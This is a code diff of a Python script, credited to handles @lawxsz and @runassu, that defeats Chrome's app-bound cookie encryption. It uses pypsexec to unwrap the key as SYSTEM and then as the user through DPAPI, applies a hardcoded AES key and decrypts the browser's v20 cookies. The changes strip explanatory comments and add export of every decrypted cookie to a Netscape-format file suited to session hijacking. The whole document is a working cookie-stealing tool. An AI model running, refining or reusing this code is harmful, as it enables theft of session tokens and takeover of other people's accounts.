@@ -1,13 +1,16 @@
+# script @lawxsz @runassu
+
 import os
 import json
-import sys
 import binascii
+import sys
 from pypsexec.client import Client
 from Crypto.Cipher import AES
 import sqlite3
 import pathlib
 
-# colaborate with @runassu :)
+current_directory = os.getcwd()
+output_file = os.path.join(current_directory, "lawxsz_cookies.txt")
 
 user_profile = os.environ['USERPROFILE']
 local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
@@ -34,14 +37,12 @@ try:
     app_bound_encrypted_key_b64 = binascii.b2a_base64(
         binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
 
-    # decrypt with SYSTEM DPAPI
     encrypted_key_b64, stderr, rc = c.run_executable(
         sys.executable,
         arguments=arguments.format(app_bound_encrypted_key_b64),
         use_system_account=True
     )
 
-    # decrypt with user DPAPI
     decrypted_key_b64, stderr, rc = c.run_executable(
         sys.executable,
         arguments=arguments.format(encrypted_key_b64.decode().strip()),
@@ -55,23 +56,17 @@ finally:
     c.remove_service()
     c.disconnect()
 
-# decrypt key with AES256GCM
-# aes key from elevation_service.exe
 aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
-
-# [flag|iv|ciphertext|tag] decrypted_key
-# [1byte|12bytes|variable|16bytes]
 iv = decrypted_key[1:1+12]
 ciphertext = decrypted_key[1+12:1+12+32]
 tag = decrypted_key[1+12+32:]
 
 cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
 key = cipher.decrypt_and_verify(ciphertext, tag)
-print(binascii.b2a_base64(key))
 
 con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
 cur = con.cursor()
-r = cur.execute("SELECT host_key, name, encrypted_value from cookies;")
+r = cur.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies;")
 cookies = cur.fetchall()
 cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
 con.close()
@@ -84,5 +79,13 @@ def decrypt_cookie_v20(encrypted_value):
     decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag).decode()
     return decrypted_cookie
 
-for c in cookies_v20:
-    print(c[0], c[1], decrypt_cookie_v20(c[2]))
+with open(output_file, "w") as f:
+    f.write("# Formated cookies by lawxsz\n")
+
+    for c in cookies_v20:
+        host_key, name, encrypted_value, path, expires_utc, is_secure = c
+        value = decrypt_cookie_v20(encrypted_value)
+        is_secure = "TRUE" if is_secure else "FALSE"
+        f.write(f"{host_key}\t{'TRUE' if host_key.startswith('.') else 'FALSE'}\t{path}\t{is_secure}\t{expires_utc}\t{name}\t{value}\n")
+
+print(f"Cookies saved to {output_file}")
